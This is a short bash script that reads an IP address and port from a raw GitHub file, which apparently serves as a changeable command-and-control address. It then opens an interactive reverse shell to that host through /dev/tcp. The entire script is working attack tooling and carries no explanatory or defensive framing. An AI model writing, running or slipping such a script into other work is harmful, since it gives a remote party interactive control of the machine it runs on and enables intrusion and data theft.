#!/bin/bash

# GitHub file with format: IP_ADDRESS:PORT
GITHUB_URL="https://raw.githubusercontent.com/username/repo-name/main/connection.txt"

# Fetch IP and Port from GitHub
DATA=$(curl -s "$GITHUB_URL")

# Extract IP and Port
SERVER_IP="${DATA%%:*}"
PORT="${DATA##*:}"

# Launch reverse shell
bash -i >& /dev/tcp/"$SERVER_IP"/"$PORT" 0>&1
